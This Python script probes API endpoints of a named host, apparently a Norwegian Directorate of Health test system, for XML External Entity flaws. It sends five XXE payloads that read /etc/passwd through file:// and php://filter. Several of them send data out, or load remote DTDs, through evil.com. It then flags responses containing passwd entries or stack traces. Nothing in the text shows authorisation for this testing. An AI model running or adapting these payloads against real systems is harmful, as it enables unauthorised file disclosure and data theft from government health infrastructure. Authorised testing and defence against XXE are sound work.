import requests
import json
import time

BASE_URL = "https://fat.kote.helsedirektoratet.no"

headers = {
    "Accept-Language": "nb",
    "Content-Type": "application/xml",
    "Accept": "application/json"
}

def test_xxe_vulnerability():
    """Test for XML External Entity (XXE) vulnerabilities in API endpoints"""
    print("Testing for XXE vulnerabilities...")
    
    # Endpoints that might process XML
    test_endpoints = [
        "/api/code-systems",
        "/api/medicines/clinical-drugs",
        "/api/diagnosis/icpc2",
        "/api/fest/merkevarer",
        "/api/snomed/1234567890"
    ]
    
    # XXE payloads to test
    xxe_payloads = [
        # Classic XXE
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>""",
        
        # XXE with parameter entities
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE data [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?x=%file;'>">
        %eval;
        %exfil;
        ]>
        <data>XXE Test</data>""",
        
        # XXE with PHP filter wrapper
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE data [
        <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >]>
        <data>&xxe;</data>""",
        
        # OOB XXE with FTP
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE data [
        <!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">
        %remote;
        ]>
        <data>OOB XXE Test</data>""",
        
        # XXE with CDATA
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE data [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % start "<![CDATA[">
        <!ENTITY % end "]]>">
        <!ENTITY % dtd SYSTEM "http://evil.com/wrapper.dtd">
        %dtd;
        ]>
        <data>XXE with CDATA</data>"""
    ]
    
    findings = []
    
    for endpoint in test_endpoints:
        for payload in xxe_payloads:
            url = f"{BASE_URL}{endpoint}"
            
            # Try POST with XML payload
            try:
                response = requests.post(url, headers=headers, data=payload, timeout=10)
                
                # Look for indicators in the response
                interesting_patterns = [
                    "root:",  # Linux passwd file
                    "daemon:",  # Linux passwd file
                    "Administrator:",  # Windows
                    "PK\x03\x04",  # ZIP file signature (could be in error responses)
                    "</passwd>",  # XML formatted passwd file
                    "<?xml",  # XML response
                    "file:///",  # URI scheme leakage
                    "internal server error",  # Some error messages
                    "exception",  # Error stack trace
                    "stacktrace"  # Error stack trace
                ]
                
                found_patterns = []
                for pattern in interesting_patterns:
                    if pattern.lower() in response.text.lower():
                        found_patterns.append(pattern)
                
                if found_patterns:
                    findings.append({
                        "type": "xxe_vulnerability",
                        "endpoint": endpoint,
                        "method": "POST",
                        "status_code": response.status_code,
                        "response_length": len(response.text),
                        "suspicious_patterns": found_patterns,
                        "response_preview": response.text[:200] + "...", 
                        "risk": "Critical"
                    })
                
                # Also check for unusually long response or different status code
                if len(response.text) > 10000:  # Arbitrary length threshold
                    findings.append({
                        "type": "xxe_large_response",
                        "endpoint": endpoint,
                        "method": "POST",
                        "status_code": response.status_code,
                        "response_length": len(response.text),
                        "risk": "Medium"
                    })
                
            except requests.exceptions.Timeout:
                # Timeout might indicate successful XXE
                findings.append({
                    "type": "xxe_timeout",
                    "endpoint": endpoint,
                    "method": "POST",
                    "description": "Request timed out, possible XXE vulnerability",
                    "risk": "High"
                })
            except Exception as e:
                pass  # Ignore other errors
            
            # Small delay between requests
            time.sleep(1)
    
    # Save findings
    if findings:
        with open("xxe_findings.json", "w", encoding="utf-8") as f:
            json.dump(findings, f, indent=2)
        
        print(f"Found {len(findings)} potential XXE vulnerabilities. Details saved to xxe_findings.json")
    else:
        print("No XXE vulnerabilities detected.")
    
    return findings

if __name__ == "__main__":
    print("Starting XXE vulnerability tests against Helsedirektoratet API...")
    findings = test_xxe_vulnerability()